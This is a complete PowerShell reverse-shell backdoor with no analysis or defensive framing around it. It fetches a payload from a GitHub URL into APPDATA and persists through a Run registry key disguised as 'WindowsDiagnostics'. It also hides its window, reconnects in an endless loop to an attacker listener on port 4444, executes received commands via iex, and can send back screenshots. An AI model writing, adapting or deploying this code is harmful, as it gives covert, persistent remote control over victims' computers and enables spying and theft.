# --- CONFIG ---
$ip = '192.168.1.15'
$port = 4444
$url = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1'
$installPath = "$env:APPDATA\win_diag.ps1"

# --- 1. BOOT DELAY (Wait for Wi-Fi to stabilize) ---
Start-Sleep -Seconds 15

# --- 2. SELF-REPAIR PERSISTENCE ---
if (!(Test-Path $installPath)) {
    try {
        (New-Object Net.WebClient).DownloadFile($url, $installPath)
        $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $key -Name "WindowsDiagnostics" -Value "powershell.exe -w hidden -nop -f `"$installPath`""
    } catch { } # Silently fail if GitHub is blocked
}

# --- 3. INSTANT WINDOW HIDE ---
$code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$win = Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Util" -PassThru
$hwnd = (Get-Process -Id $PID).MainWindowHandle
if ($hwnd -ne 0) { $win::ShowWindow($hwnd, 0) }

# --- 4. THE "NEVER-GIVE-UP" LOOP ---
while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient
        $c.Connect($ip, $port) # Try to connect
        $s = $c.GetStream(); $r = New-Object System.IO.StreamReader($s); $w = New-Object System.IO.StreamWriter($s)
        $w.AutoFlush = $true
        $w.WriteLine("--- ATOMIC V3.2 CONNECTED: $env:COMPUTERNAME ---")

        while($c.Connected) {
            $w.Write("PS " + (Get-Location).Path + "> ")
            $line = $r.ReadLine()
            if ($null -eq $line -or $line -eq "exit") { break }

            if ($line.Trim() -eq "screenshot") {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
            } 
            else {
                $out = try { iex $line 2>&1 | Out-String } catch { $_.Exception.Message }
                $w.WriteLine($out)
            }
        }
    } catch { 
        # Connection failed or dropped. Wait 20s and try the whole loop again.
        Start-Sleep -Seconds 20 
    } finally {
        if ($c) { $c.Close() }
    }
}
